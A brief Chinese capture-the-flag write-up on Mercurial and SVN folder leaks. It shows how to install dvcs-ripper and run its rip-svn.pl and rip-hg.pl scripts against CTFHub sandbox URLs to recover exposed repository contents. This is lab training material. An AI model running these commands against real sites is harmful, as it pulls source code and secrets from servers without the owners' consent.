## HG、SVN..泄露

采用工具`dvcs-ripper`

```bash
#安装在linux上

#克隆项目
git clone https://github.com/kost/dvcs-ripper.git
#安装perl环境
sudo apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl

#使用
cd dvcs-ripper 
```

具体功能如下，可以处理`cvs`、`.hg` 、`.svn`

```bash
hg-decode.pl  README.md   rip-cvs.pl  rip-hg.pl
LICENSE       rip-bzr.pl  rip-git.pl  rip-svn.pl
```

```bash
./rip-svn.pl -v -u http://challenge-75f38189dd21839a.sandbox.ctfhub.com:10800/.svn

./rip-hg.pl -v -u http://challenge-f84d76c55f28adc6.sandbox.ctfhub.com:10800/.hg/

ls -al

tree .hg/.svn
```



### .HG泄露

> 题目描述：当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞

直接交链接，交给工具处理





### .SVN泄露

> 题目描述：当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞

与`.HG泄露`类似操作